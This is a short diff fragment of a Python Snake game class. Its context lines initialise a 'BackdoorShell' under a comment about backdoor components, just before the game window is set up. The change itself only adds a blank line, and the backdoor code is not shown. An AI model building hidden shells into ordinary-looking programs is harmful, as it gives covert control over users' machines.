@@ -634,6 +634,7 @@ class SnakeGame:
         
         # Initialize backdoor components
         self.shell = BackdoorShell()
+
         
         # Set up display
         self.screen = pygame.display.set_mode((GAME_WIDTH, GAME_HEIGHT))
